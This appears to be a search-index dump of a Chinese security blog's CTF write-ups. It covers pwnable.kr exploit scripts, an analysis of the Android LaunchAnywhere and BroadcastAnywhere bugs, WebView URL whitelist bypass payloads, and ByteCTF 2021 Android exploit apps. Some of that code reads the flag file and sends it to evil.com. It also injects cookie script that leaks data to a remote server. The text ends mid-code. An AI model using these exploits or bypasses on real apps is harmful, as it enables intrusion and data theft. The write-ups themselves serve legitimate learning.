fast_memcpy(char* dest, const char* src, size_t len){ size_t i; // 64-byte block fast copy if(len \u003e= 64){ i = len / 64; len \u0026= (64-1); while(i-- \u003e 0){ __asm__ __volatile__ ( \"movdqa (%0), %%xmm0\\n\" \"movdqa 16(%0), %%xmm1\\n\" \"movdqa 32(%0), %%xmm2\\n\" \"movdqa 48(%0), %%xmm3\\n\" \"movntps %%xmm0, (%1)\\n\" \"movntps %%xmm1, 16(%1)\\n\" \"movntps %%xmm2, 32(%1)\\n\" \"movntps %%xmm3, 48(%1)\\n\" ::\"r\"(src),\"r\"(dest):\"memory\"); dest += 64; src += 64; } } // byte-to-byte slow copy if(len) slow_memcpy(dest, src, len); return dest; } movntps和movdqa要求操作的内存地址必须为16字节对齐 ","date":"2021-11-03","objectID":"/pwnable_kr_1/:17:0","tags":null,"title":"pwnable.kr first part","uri":"/pwnable_kr_1/"},{"categories":["writeup"],"content":"asm 有沙箱，只能用open, read, write from pwn import * context(arch='amd64', os='linux') s = ssh(host=\"pwnable.kr\", user=\"asm\", port=2222, password=\"guest\") if s.connected(): p = s.connect_remote(\"127.0.0.1\",9026) payload=shellcraft.open(\"flag\") # read file payload+=shellcraft.read(\"rax\", \"rsp\", 0x100) # write stdout payload+=shellcraft.write(1, \"rsp\", 0x100) # p.recv(1024) #gdb.attach(p) p.send(asm(payload)) p.interactive() p.close() ","date":"2021-11-03","objectID":"/pwnable_kr_1/:18:0","tags":null,"title":"pwnable.kr first part","uri":"/pwnable_kr_1/"},{"categories":["writeup"],"content":"unlink #include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e#include \u003cstring.h\u003etypedef struct tagOBJ{ struct tagOBJ* fd; struct tagOBJ* bk; char buf[8]; }OBJ; void shell(){ system(\"/bin/sh\"); } void unlink(OBJ* P){ OBJ* BK; OBJ* FD; BK=P-\u003ebk; FD=P-\u003efd; FD-\u003ebk=BK; BK-\u003efd=FD; } int main(int argc, char* argv[]){ malloc(1024); OBJ* A = (OBJ*)malloc(sizeof(OBJ)); OBJ* B = (OBJ*)malloc(sizeof(OBJ)); OBJ* C = (OBJ*)malloc(sizeof(OBJ)); // double linked list: A \u003c-\u003e B \u003c-\u003e C A-\u003efd = B; B-\u003ebk = A; B-\u003efd = C; C-\u003ebk = B; printf(\"here is stack address leak: %p\\n\", \u0026A); printf(\"here is heap address leak: %p\\n\", A); printf(\"now that you have leaks, get shell!\\n\"); // heap overflow! gets(A-\u003ebuf); // exploit this unlink! unlink(B); return 0; } heap overflow + unlink实现任意写 本来想直接覆盖unlink函数的返回地址，修改成shell函数的起始地址，但是这样会导致[Shell函数的起始地址+4 ] = Unlink的返回地址，text段不可写会出错。也就是说只能够找两处可写的地址进行修改。 main函数结尾处的指令如下： .text:080485FF 8B 4D FC mov ecx, [ebp+var_4] .text:08048602 C9 leave .text:08048603 8D 61 FC lea esp, [ecx-4] .text:08048606 C3 retn 这里将栈中的内容赋值给ecx leave相当于mov esp, ebp; pop ebp 然后又将esp = ecx - 4，即可以操控栈顶。 因此，可以构造 [ecx-4] = shell的起始地址，在retn的时候就可以转到shell处执行。 from pwn import * s = ssh(host=\"pwnable.kr\", user=\"unlink\", port=2222, password=\"guest\") if s.connected(): p = s.process('/home/unlink/unlink') p.recvuntil(\"here is stack address leak: \") stack_base_str = p.recvuntil('\\n') success(\"stack_base: \" + stack_base_str) stack_base = int(stack_base_str, 16) p.recvuntil(\"here is heap address leak: \") heap_base_str = p.recvuntil('\\n') success(\"heap_base: \" + heap_base_str) heap_base = int(heap_base_str, 16) shell_addr = 0x080484EB payload = p32(shell_addr) + \"a\" * 12 + p32(stack_base + 16 - 4) + p32(heap_base + 12) p.sendline(payload) p.interactive() p.close() ","date":"2021-11-03","objectID":"/pwnable_kr_1/:19:0","tags":null,"title":"pwnable.kr first part","uri":"/pwnable_kr_1/"},{"categories":["writeup"],"content":"blukat 本来以为没啥入手点结果看别人wp说blukat和blukat_pwn两个用户在一个组里所以可以直接读password文件的内容… ","date":"2021-11-03","objectID":"/pwnable_kr_1/:20:0","tags":null,"title":"pwnable.kr first part","uri":"/pwnable_kr_1/"},{"categories":["writeup"],"content":"horcruxes rop转到给的七个函数处打印出来各个变量的值然后求和 总和不能超过int所以需要循环试几次才能出flag ","date":"2021-11-03","objectID":"/pwnable_kr_1/:21:0","tags":null,"title":"pwnable.kr first part","uri":"/pwnable_kr_1/"},{"categories":["writeup"],"content":"看起来是好久远的两个洞了，Android 5.0上的。因为字节的比赛了解了一下，就写一下具体原理。 ","date":"2021-10-22","objectID":"/anywhere/:0:0","tags":null,"title":"LaunchAnywhere 和 BroadcastAnywhere","uri":"/anywhere/"},{"categories":["writeup"],"content":"LaunchAnywhere Intend Based提取漏洞，可以突破应用间的权限隔离，达到调用任意私有Activity(exported=false)的目的。 ","date":"2021-10-22","objectID":"/anywhere/:1:0","tags":null,"title":"LaunchAnywhere 和 BroadcastAnywhere","uri":"/anywhere/"},{"categories":["writeup"],"content":"AccountManager 帐号管理器，集中管理apps注册的不同类型的帐号。 不同类型的帐号服务会使用不同的帐号登录和鉴权方式，所以AccountManager为不同类型的帐号提供一个插件式authenticator模块，authenticators自己处理帐号登录/认证的具体细节，也可以自己存储帐号信息。 AccountManager是一个面向应用程序开发的组件，它提供了一套对应于IAccountManager协议的应用程序接口；这组接口通过Binder机制与系统服务AccountManagerService进行通信，协作完成帐号相关的操作。同时，AccountManager接收authenticators提供的回调，以便在帐号操作完成之后向调用此帐号服务的业务返回对应的接口，同时触发这个业务对结果的处理。 authenticators即注册帐号服务的app； 业务调用方 即使用authenticators提供的帐号服务的第三方，也可以是authenticator自己 具体过程： ","date":"2021-10-22","objectID":"/anywhere/:1:1","tags":null,"title":"LaunchAnywhere 和 BroadcastAnywhere","uri":"/anywhere/"},{"categories":["writeup"],"content":"漏洞原理 AccountManager.addAccount: 最后执行一个AmsTask的异步任务。mRespone是一个Binder对象，当AuthenticationService指定Intent后，就是把Intent保存到这个respone对象里。 然后在Response中直接startActivity 对于有系统权限的用户可以不管组件是否是exported=true都可以直接调用: 如图，System用户直接返回PERMISSION_GRANTED 根据以上分析可知，理论上AuthenticationService可以随意指定Intent。如果可以让系统Setting(uid是system进程)调用addAccount方法，EvilAuthenService就可以指定任何Intent。 ","date":"2021-10-22","objectID":"/anywhere/:1:2","tags":null,"title":"LaunchAnywhere 和 BroadcastAnywhere","uri":"/anywhere/"},{"categories":["writeup"],"content":"利用 AppA请求添加一个特定类型的网络账号 系统查询到AppB可以提供一个该类型的网络账号服务，系统向AppB发起请求 AppB返回了一个intent给系统，系统把intent转发给appA AccountManagerResponse在AppA的进程空间内调用 startActivity(intent)调起一个Activity，AccountManagerResponse是FrameWork中的代码， AppA对这一调用毫不知情。 如果AppA是一个system权限应用，比如Settings，那么AppA能够调用起任意AppB指定的未导出Activity. Settings提供调用addAccount的接口。只要调用com.android.settings.accounts.AddAccountSettings，并给Intent带上特定的参数，即可让Settings触发launchAnyWhere： Intent intent1 = new Intent(); intent1.setComponent(new ComponentName( \"com.android.settings\", \"com.android.settings.accounts.AddAccountSettings\")); intent1.setAction(Intent.ACTION_RUN); intent1.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK); String authTypes[] = {Constants.ACCOUNT_TYPE}; intent1.putExtra(\"account_types\", authTypes); AuthenticatorActivity.this.startActivity(intent1); 过程： 因为可以调用任意组件。所以存在以下应用场景： 重置pin码：直接打开重置pin码的页面绕过pin码认证界面 调用微信内置浏览器 调用支付宝钱包内置浏览器 ","date":"2021-10-22","objectID":"/anywhere/:1:3","tags":null,"title":"LaunchAnywhere 和 BroadcastAnywhere","uri":"/anywhere/"},{"categories":["writeup"],"content":"修复 检查AuthenticationService返回的Intent所指向的Activity是否与AppB具有相同的签名。 ","date":"2021-10-22","objectID":"/anywhere/:1:4","tags":null,"title":"LaunchAnywhere 和 BroadcastAnywhere","uri":"/anywhere/"},{"categories":["writeup"],"content":"BroadcastAnywhere 与LaunchAnywhere原理相似，通过这个漏洞，攻击者可以无视BroadcastReceiver组件访问限制，以system用户的身份发送广播。 ","date":"2021-10-22","objectID":"/anywhere/:2:0","tags":null,"title":"LaunchAnywhere 和 BroadcastAnywhere","uri":"/anywhere/"},{"categories":["writeup"],"content":"漏洞原理 AddAccountSettings的addAccount方法： mPendingIntent用来做身份识别，其中intent部分为简单的new Intent()即空的Intent对象。 PendingIntent对象可以按预先指定的动作进行触发，当这个对象传递（通过Binder）到其他进程（不同uid的用户）,其他进程利用这个PendingIntent对象，可以原进程的身份权限执行指定的触发动作。另外，由于触发的动作是由系统进程执行的，因此哪怕原进程已经不存在了，PendingIntent对象上的触发动作依然有效。 比如说A进程作为发起端，它可以从系统“获取”一个PendingIntent，然后A进程可以将PendingIntent对象通过binder机制“传递”给B进程，再由B进程在未来某个合适时机，“回调”PendingIntent对象的send()动作，完成激发。 在Android系统中，最适合做集中性管理的组件就是AMS（Activity Manager Service）, 由它承担起管理所有PendingIntent的职责。具体可见参考链接中的【说说PendingIntent的内部机制】 ​ 我们先要理解，所谓的“发起端获取PendingIntent”到底指的是什么。难道只是简单new一个PendingIntent对象吗？当然不是。此处的“获取”动作其实还含有向AMS“注册”intent的语义。 ​ 在PendingIntent.java文件中，我们可以看到有如下几个比较常见的静态函数： public static PendingIntent getActivity(Context context, int requestCode, Intent intent, int flags) public static PendingIntent getBroadcast(Context context, int requestCode, Intent intent, int flags) public static PendingIntent getService(Context context, int requestCode, Intent intent, int flags) public static PendingIntent getActivities(Context context, int requestCode, Intent[] intents, int flags) public static PendingIntent getActivities(Context context, int requestCode, Intent[] intents, int flags, Bundle options) 它们就是我们常用的获取PendingIntent的动作了。 上面的getActivity()的意思其实是，获取一个PendingIntent对象，而且该对象日后激发时所做的事情是启动一个新activity。也就是说，当它异步激发时，会执行类似Context.startActivity()那样的动作。相应地，getBroadcast()和getService()所获取的PendingIntent对象在激发时，会分别执行类似Context..sendBroadcast()和Context.startService()这样的动作。至于最后两个getActivities()，用得比较少，激发时可以启动几个activity。 PendingIntent.getBroadcast源码： 实际调用了ActivityManagerService中的getIntentSender方法。关键代码如下： public IIntentSender getIntentSender(int type, String packageName, IBinder token, String resultWho, int requestCode, Intent[] intents, String[] resolvedTypes, int flags, Bundle options, int userId) { enforceNotIsolatedCaller(\"getIntentSender\"); ... ... synchronized(this) { int callingUid = Binder.getCallingUid(); int origUserId = userId; userId = handleIncomingUser(Binder.getCallingPid(), callingUid, userId, type == ActivityManager.INTENT_SENDER_BROADCAST, false, \"getIntentSender\", null); ... ... return getIntentSenderLocked(type, packageName, callingUid, userId, token, resultWho, requestCode, intents, resolvedTypes, flags, options); } catch (RemoteException e) { throw new SecurityException(e); } } } } IIntentSender getIntentSenderLocked(int type, String packageName, int callingUid, int userId, IBinder token, String resultWho, int requestCode, Intent[] intents, String[] resolvedTypes, int flags, Bundle options) { if (DEBUG_MU) Slog.v(TAG_MU, \"getIntentSenderLocked(): uid=\" + callingUid); ActivityRecord activity = null; ... PendingIntentRecord.Key key = new PendingIntentRecord.Key(type, packageName, activity, resultWho, requestCode, intents, resolvedTypes, flags, options, userId); //依据调用者的信息，生成PendingIntentRecord.Key对象 WeakReference\u003cPendingIntentRecord\u003e ref; ref = mIntentSenderRecords.get(key); PendingIntentRecord rec = ref != null ? ref.get() : null; ... rec = new PendingIntentRecord(this, key, callingUid); //最后生成PendingIntentRecord对象 mIntentSenderRecords.put(key, rec.ref); //保存 ... return rec; //并返回 } AMS会把生成PenddingIntent的进程（Caller）信息保存到PendingIntentRecord.Key。并为其维护一个PendingIntentRecord对象。 PendingIntent的send方法最终调用到PendingIntentRecord的sendInner方法。 int sendInner(int code, Intent intent, String resolvedType, IIntentReceiver finishedReceiver, String requiredPermission, IBinder resultTo, String resultWho, int requestCode, int flagsMask, int flagsValues, Bundle options) { synchronized(owner) { if (!canceled) { sent = true; if ((key.flags\u0026PendingIntent.FLAG_ONE_SHOT) != 0) { owner.cancelIntentSenderLocked(this, true); canceled = true; } Intent finalIntent = key.requestIntent != null ? new Intent(key.requestIntent) : new Intent(); if (intent != null) { int changes = finalIntent.fillIn(intent, key.flags); //用传进来的intent进行填充finalIntent if ((changes\u0026Intent.FILL_IN_DATA) == 0) { resolvedType = key.requestResolvedType; } } else { resolvedType = key.requestResolvedType; } ... ... s","date":"2021-10-22","objectID":"/anywhere/:2:1","tags":null,"title":"LaunchAnywhere 和 BroadcastAnywhere","uri":"/anywhere/"},{"categories":["writeup"],"content":"利用 接收pendingIntent并send一个恶意的广播信息 // the exploit of broadcastAnyWhere final String KEY_CALLER_IDENTITY = \"pendingIntent\"; PendingIntent pendingintent = options.getParcelable(KEY_CALLER_IDENTITY); Intent intent_for_broadcast = new Intent(\"android.intent.action.BOOT_COMPLETED\"); intent_for_broadcast.putExtra(\"info\", \"I am bad boy\"); try { pendingintent.send(mContext, 0, intent_for_broadcast); } catch (CanceledException e) { e.printStackTrace(); } 尽管普通APP无法访问其他APP的notification，但利用AccessiblyService或者 NotificationListenerService，一个APP可能可以获取其他notification中的pendingintent，导致权限泄露(例子就是bytectf2021中mediumdroid)。 ","date":"2021-10-22","objectID":"/anywhere/:2:2","tags":null,"title":"LaunchAnywhere 和 BroadcastAnywhere","uri":"/anywhere/"},{"categories":["writeup"],"content":"修复 用填充的identityIntent代替双无Intent Intent identityIntent = new Intent(); identityIntent.setComponent(new ComponentName(SHOULD_NOT_RESOLVE, SHOULD_NOT_RESOLVE)); identityIntent.setAction(SHOULD_NOT_RESOLVE); identityIntent.addCategory(SHOULD_NOT_RESOLVE); mPendingIntent = PendingIntent.getBroadcast(this, 0, identityIntent, 0); ","date":"2021-10-22","objectID":"/anywhere/:2:3","tags":null,"title":"LaunchAnywhere 和 BroadcastAnywhere","uri":"/anywhere/"},{"categories":["writeup"],"content":"参考链接 launchAnyWhere: Activity组件权限绕过漏洞解析(Google Bug 7699048 ) Android LaunchAnyWhere (Google Bug 7699048)漏洞详解及防御措施 Android BroadcastAnyWhere(Google Bug 17356824)漏洞具体分析 BroadcastAnywhere漏洞分析 说说PendingIntent的内部机制 ","date":"2021-10-22","objectID":"/anywhere/:3:0","tags":null,"title":"LaunchAnywhere 和 BroadcastAnywhere","uri":"/anywhere/"},{"categories":["notes"],"content":"Url绕过 RFC中URL格式定义: \u003cprotocol\u003e://\u003cuser\u003e:\u003cpassword\u003e@\u003chost\u003e:\u003cport\u003e/\u003curl-path\u003e 其中:部分是Authority字段，用来向所请求的访问受限资源提供用户凭证。比如访问一个需要认证的ftp资源，用户名为test，密码为123456，可以直接在浏览器中输入URL：ftp://test:123456@your.site/。 以下是一些常见的Url检测和绕过的方式，内容来自参考链接。 indexOf(url)\u003e0绕过： private static boolean checkDomain(String inputUrl) { String[] whiteList=new String[]{\"site1.com\",\"site2.com\"}; for (String whiteDomain:whiteList) { if (inputUrl.indexOf(whiteDomain)\u003e0) return true; } return false; } 绕过方式: http://evil.com/poc.htm?site1.com indexOf提取域名校验 private static boolean checkDomain(String inputUrl) { String[] whiteList=new String[]{\"site1.com\",\"site2.com\"}; String tempStr=inputUrl.replace(\"http://\",\"\"); String inputDomain=tempStr.substring(0,tempStr.indexOf(\"/\")); //提取host for (String whiteDomain:whiteList) { if (inputDomain.indexOf(whiteDomain)\u003e0) return true; } return false; } 提取://和/之间的字符串当作host进行校验 payload: http://site1.com@evil.com/poc.htm URL类中的getHost + indexOf private static boolean checkDomain(String inputUrl) throws MalformedURLException { String[] whiteList=new String[]{\"site1.com\",\"site2.com\"}; java.net.URL url=new java.net.URL(inputUrl); String inputDomain=url.getHost(); //提取host for (String whiteDomain:whiteList) { if (inputDomain.indexOf(whiteDomain)) return true; } return false; } payload: http://www.site1.com.evil.com/poc.html 上述URL包含site1.com但是其中 www.site1.com 只是evil.com这个域名的子域名，还是指向攻击者控制的服务器。 getHost + endsWith payload: http://evilsite1.com/ getHost + endsWith + ‘.’ String inputDomain=url.getHost(); //提取host for (String whiteDomain:whiteList) { if (inputDomain.endsWith(\".\"+whiteDomain)) //www.site1.com return true; } getHost方法并不一定能得到正确的域名信息 payload: http://evil.com\\@www.site1.com/poc.html 这里getHost得到的是www.site1.com 但是实际访问的是evil.com服务器，不过攻击页面不能叫poc.html，根据访问日志需要叫/@.site.com/poc.html(没具体验证这条，不懂为何www没了…) 另一种绕过方法: http://evil.com\\.site1.com 这里getHost方法得到的是evil.com.site1.com但是实际访问的是evil.com服务器 URI代替URL private static boolean checkDomain(String inputUrl) throws URISyntaxException { String[] whiteList=new String[]{\"site1.com\",\"site2.com\"}; java.net.URI url=new java.net.URI(inputUrl); String inputDomain=url.getHost(); //提取host for (String whiteDomain:whiteList) { if (inputDomain.endsWith(\".\"+whiteDomain)) //www.site1.com return true; } return false; } payload: JavaScript://www.site1.com/%0d%0awindow.location.href='http://evil.com/poc.html' 但是webview实际执行的是如下两行JavaScript代码: //www.site1.com/ window.location.href='http://evil.com/poc.html' 第一行通过//符号来骗过java.net.URI获取到值为www.site1.com的host，恰好//符号在Javascript的世界里是行注释符号，所以第一行实际并没有执行；然后通过%0d%0a换行，继续执行window.location.href=‘http://evil.com/poc.html'请求poc页面. URI + 协议校验 payload: http://www.site1.com/redirect.php?url=http://evil.com/poc.html Webview在请求http://www.site1.com/redirect.php?url=http://evil.com/poc.html 的时候，实际是发出了两次请求，第一次是在loadUrl中请求http://www.site1.com/redirect.php?url=http://evil.com/poc.html， 第二次是请求http://evil.com/poc.html ，但是第二次请求发生在loadUrl之后，而我们的白名单校验逻辑在loadUrl之前，才导致了绕过。 所以需要重写webview的shouldOverrideUrlLoading方法，该方法会在webview后续加载其他url的时候回调。 参考链接: 一文彻底搞懂安卓WebView白名单校验 ","date":"2021-10-19","objectID":"/url-bypass/:1:0","tags":null,"title":"Webview白名单绕过","uri":"/url-bypass/"},{"categories":["writeup"],"content":"有几道Android pwn感觉挺有意思的 ","date":"2021-10-17","objectID":"/bytectf2021-pre/:0:0","tags":null,"title":"Bytectf2021初赛","uri":"/bytectf2021-pre/"},{"categories":["writeup"],"content":"Intent重定向 Intent是Android 常用的组件间互相通信的信息对象，常用于启动组件或传递数据 Intent重定向漏洞类似web中的SSRF，可以借助可导出的应用重定向到非导出的应用 通过intent重定向，可以以目标app的权限来间接访问到应用中的未导出的组件，即launch anywhere。 常见的利用场景 系统settings可以绕过密码认证的界面打开重置手机pin码的activity 打开未导出的webview组件进一步转化为webview的漏洞 打开外部app，这个过程中可以进行一次临时的授权，给予外部app对文件的读写权限。 Intent重定向的常见形式: ","date":"2021-10-17","objectID":"/bytectf2021-pre/:1:0","tags":null,"title":"Bytectf2021初赛","uri":"/bytectf2021-pre/"},{"categories":["writeup"],"content":"babydroid ","date":"2021-10-17","objectID":"/bytectf2021-pre/:2:0","tags":null,"title":"Bytectf2021初赛","uri":"/bytectf2021-pre/"},{"categories":["writeup"],"content":"Apk分析 Manifest文件: \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003cmanifest xmlns:android=\"http://schemas.android.com/apk/res/android\" android:versionCode=\"1\" android:versionName=\"1.0\" android:compileSdkVersion=\"30\" android:compileSdkVersionCodename=\"11\" package=\"com.bytectf.babydroid\" platformBuildVersionCode=\"30\" platformBuildVersionName=\"11\"\u003e \u003cuses-sdk android:minSdkVersion=\"21\" android:targetSdkVersion=\"30\"/\u003e \u003capplication android:theme=\"@style/Theme.Babydroid\" android:label=\"@string/app_name\" android:icon=\"@mipmap/ic_launcher\" android:debuggable=\"true\" android:allowBackup=\"true\" android:supportsRtl=\"true\" android:roundIcon=\"@mipmap/ic_launcher_round\" android:appComponentFactory=\"androidx.core.app.CoreComponentFactory\"\u003e \u003cactivity android:name=\"com.bytectf.babydroid.MainActivity\" android:exported=\"true\"\u003e \u003cintent-filter\u003e \u003caction android:name=\"android.intent.action.MAIN\"/\u003e \u003ccategory android:name=\"android.intent.category.LAUNCHER\"/\u003e \u003c/intent-filter\u003e \u003c/activity\u003e \u003cactivity android:name=\"com.bytectf.babydroid.Vulnerable\"\u003e \u003cintent-filter\u003e \u003caction android:name=\"com.bytectf.TEST\"/\u003e \u003c/intent-filter\u003e \u003c/activity\u003e \u003creceiver android:name=\"com.bytectf.babydroid.FlagReceiver\" android:exported=\"false\"\u003e \u003cintent-filter\u003e \u003caction android:name=\"com.bytectf.SET_FLAG\"/\u003e \u003c/intent-filter\u003e \u003c/receiver\u003e \u003cprovider android:name=\"androidx.core.content.FileProvider\" android:exported=\"false\" android:authorities=\"androidx.core.content.FileProvider\" android:grantUriPermissions=\"true\"\u003e \u003cmeta-data android:name=\"android.support.FILE_PROVIDER_PATHS\" android:resource=\"@xml/file_paths\"/\u003e \u003c/provider\u003e \u003c/application\u003e \u003c/manifest\u003e 当Activity中存在intent-filter时默认时可导出的，所以外部应用可以直接打开Vulnerable，其内容如下： public class Vulnerable extends Activity { /* access modifiers changed from: protected */ public void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); startActivity((Intent) getIntent().getParcelableExtra(\"intent\")); } } 利用这个方法可以使用传入的intent参数直接startactivity且没有任何校验，这样就可以以目标app的身份进行一次startactivity完成intent的重定向。 app中存在一个非导出的FileProvider，可以提供文件的读写和分享能力。其执行的file_paths内容如下： \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003cpaths\u003e \u003croot-path name=\"root\" path=\"\"/\u003e \u003c/paths\u003e 其导出的文件可以从root即根路径开始，都可以用这个FileProvider访问到(前提时目标app有权限访问，可以访问目标app沙箱内部的文件，以此完成沙箱内的文件读写，甚至可以读写内部的可执行文件，dex or so) 所以可以使用intent重定向来访问这个非导出的FileProvider内容，使用目标app的权限来读取其沙箱内部的文件。flag文件是通过接收广播后写入到沙箱内部files文件夹中的。 一般app中除了FileProvider还有其他可利用的内容，比如说联系人等。 ","date":"2021-10-17","objectID":"/bytectf2021-pre/:2:1","tags":null,"title":"Bytectf2021初赛","uri":"/bytectf2021-pre/"},{"categories":["writeup"],"content":"攻击过程 ","date":"2021-10-17","objectID":"/bytectf2021-pre/:2:2","tags":null,"title":"Bytectf2021初赛","uri":"/bytectf2021-pre/"},{"categories":["writeup"],"content":"Exp MainActivity: public class MainActivity extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); if(getIntent().getAction().equals(\"evil\")){ Uri data = getIntent().getData(); try { InputStream inputStream = getContentResolver().openInputStream(data); byte[] bytes = new byte[inputStream.available()]; inputStream.read(bytes); String str = new String(bytes); Log.e(\"evil\", str); httprequest(\"http://evil.com/?\" + str); } catch (FileNotFoundException e) { e.printStackTrace(); } catch (IOException e) { e.printStackTrace(); } }else{ Intent extra = new Intent(\"evil\"); extra.setClassName(getPackageName(), MainActivity.class.getName()); extra.setData(Uri.parse(\"content://androidx.core.content.FileProvider/root/data/data/com.bytectf.babydroid/files/flag\")); extra.addFlags(Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION | Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION); Intent intent = new Intent(); intent.setClassName(\"com.bytectf.babydroid\", \"com.bytectf.babydroid.Vulnerable\"); intent.setAction(\"com.bytectf.TEST\"); intent.putExtra(\"intent\", extra); startActivity(intent); } } } ","date":"2021-10-17","objectID":"/bytectf2021-pre/:2:3","tags":null,"title":"Bytectf2021初赛","uri":"/bytectf2021-pre/"},{"categories":["writeup"],"content":"easydroid ","date":"2021-10-17","objectID":"/bytectf2021-pre/:3:0","tags":null,"title":"Bytectf2021初赛","uri":"/bytectf2021-pre/"},{"categories":["writeup"],"content":"Apk分析 题目中可导出的MainActivity内容: public class MainActivity extends AppCompatActivity { /* access modifiers changed from: protected */ @Override // androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, androidx.fragment.app.FragmentActivity public void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); Uri data = getIntent().getData(); if (data == null) { data = Uri.parse(\"http://app.toutiao.com/\"); } if (data.getAuthority().contains(\"toutiao.com\") \u0026\u0026 data.getScheme().equals(\"http\")) { WebView webView = new WebView(getApplicationContext()); webView.setWebViewClient(new WebViewClient() { /* class com.bytectf.easydroid.MainActivity.AnonymousClass1 */ @Override // android.webkit.WebViewClient public boolean shouldOverrideUrlLoading(WebView view, String url) { if (!Uri.parse(url).getScheme().equals(\"intent\")) { return super.shouldOverrideUrlLoading(view, url); } try { MainActivity.this.startActivity(Intent.parseUri(url, 1)); } catch (URISyntaxException e) { e.printStackTrace(); } return true; } }); setContentView(webView); webView.getSettings().setJavaScriptEnabled(true); webView.loadUrl(data.toString()); } } } if条件部分可以绕过。payload: http://toutiao.com@evil.com/poc.htm 在shouldOverrideUrlLoading中可以看到，传入的是intent协议时可以发生跳转。即一次intent重定向,使用这次intent重定向可以打开export=false的TestActivity界面。 Intent.parseUri()方法的第二个参数flag有三种类型：Intent.URI_ANDROID_APP_SCHEME 和 Intent.URI_INTENT_SCHEME 还有 URI_ALLOW_UNSAFE；第三种不安全，一般不使用。 前俩种的格式为intent://host/#Intent;scheme=hansel;package=com.hansel.app;end 和 android-app://{package_id}[/{scheme}[/{host}[/{path}]]][#Intent;{…}] Intent.parseUri()源码: public static Intent parseUri(String uri, int flags) throws URISyntaxException { int i = 0; try { final boolean androidApp = uri.startsWith(\"android-app:\"); // flag传入URI_INTENT_SCHEME这个条件成立，生成的是自定义的scheme协议，非intent://和app-android://,所以上面把自定义的scheme加入URI_INTENT_SCHEME即可 if ((flags\u0026(URI_INTENT_SCHEME|URI_ANDROID_APP_SCHEME)) != 0) { if (!uri.startsWith(\"intent:\") \u0026\u0026 !androidApp) { Intent intent = new Intent(ACTION_VIEW); try { intent.setData(Uri.parse(uri)); } catch (IllegalArgumentException e) { throw new URISyntaxException(uri, e.getMessage()); } return intent; } } // 看下是否有#Intent后续的参数内容 i = uri.lastIndexOf(\"#\"); // simple case if (i == -1) { if (!androidApp) { return new Intent(ACTION_VIEW, Uri.parse(uri)); } // old format Intent URI } else if (!uri.startsWith(\"#Intent;\", i)) { if (!androidApp) { return getIntentOld(uri, flags); } else { i = -1; } } // new format Intent intent = new Intent(ACTION_VIEW); Intent baseIntent = intent; boolean explicitAction = false;// 指定action boolean inSelector = false; // fetch data part, if present String scheme = null; String data; if (i \u003e= 0) { data = uri.substring(0, i); i += 8; // length of \"#Intent;\" } else { data = uri; } // 获取#Intent后面的附加属性 // loop over contents of Intent, all name=value; while (i \u003e= 0 \u0026\u0026 !uri.startsWith(\"end\", i)) { int eq = uri.indexOf('=', i); if (eq \u003c 0) eq = i-1; int semi = uri.indexOf(';', i); String value = eq \u003c semi ? Uri.decode(uri.substring(eq + 1, semi)) : \"\"; // action if (uri.startsWith(\"action=\", i)) { intent.setAction(value); if (!inSelector) { explicitAction = true; } } // categories else if (uri.startsWith(\"category=\", i)) { intent.addCategory(value); } // type else if (uri.startsWith(\"type=\", i)) { intent.mType = value; } // launch flags else if (uri.startsWith(\"launchFlags=\", i)) { intent.mFlags = Integer.decode(value).intValue(); if ((flags\u0026 URI_ALLOW_UNSAFE) == 0) { intent.mFlags \u0026= ~IMMUTABLE_FLAGS; } } // package else if (uri.startsWith(\"package=\", i)) { intent.mPackage = value; } // component else if (uri.startsWith(\"component=\", i)) { intent.mComponent = ComponentName.unflattenFromString(value); } // scheme else if (uri.startsWith(\"scheme=\", i)) { if (inSelector) { intent.mData = Uri.parse(value + \":\"); } else { scheme = value; } } // source bounds else if (uri.startsWith(\"sourceBounds=\", i)) { intent.mSourceBounds = Rect.unflattenFromString(value); } // selec","date":"2021-10-17","objectID":"/bytectf2021-pre/:3:1","tags":null,"title":"Bytectf2021初赛","uri":"/bytectf2021-pre/"},{"categories":["writeup"],"content":"攻击过程 打开MainActivity，使用http://toutiao.com@evil/loadCookie.html绕过校验，写入cookie并停留40秒 创建symlink.html符号连接，指向目标沙箱内Cookies数据库文件 打开MainActivity，使用http://toutiao.com@evil/loadFile.html绕过校验，触发shouldOverrideUrlLoading方法加载TestActivity，url参数设置为file:///data/user/0/com.bytectf.pwneasydroid/symlink.html 步骤1中写入的cookie中包含恶意代码，代码作用是读取页面内容并发送到远程服务器。当步骤3中用file协议加载symlink.html文件时实际上时加载/data/0/user/com.bytectf.easydroid./app_webview/Cookies文件，渲染的过程中会执行注入到cookie中的恶意代码，导致cookie内容被发送到远程服务器。 ","date":"2021-10-17","objectID":"/bytectf2021-pre/:3:2","tags":null,"title":"Bytectf2021初赛","uri":"/bytectf2021-pre/"},{"categories":["writeup"],"content":"Exp MainActivity: public class MainActivity extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); launch(\"http://toutiao.com@evilip/loadcookie.html\"); symlink(); new Handler().postDelayed(new Runnable() { @Override public void run() { launch(\"http://toutiao.com@evilip/loadfile.html\"); } }, 40000); } private void launch(String url){ Intent intent = new Intent(); intent.setClassName(\"com.bytectf.easydroid\", \"com.bytectf.easydroid.MainActivity\"); Uri uri = Uri.parse(url); intent.setData(uri); intent.addFlags(Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION | Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION); startActivity(intent); } private String symlink() { String root = getApplicationInfo().dataDir; String symlink = root + \"/symlink.html\"; Log.e(\"url\", symlink); try{ String cookies = getPackageManager().getApplicationInfo(\"com.bytectf.easydroid\", 0).dataDir + \"/app_webview/Cookies\"; Runtime.getRuntime().exec(\"rm \" + symlink).waitFor(); 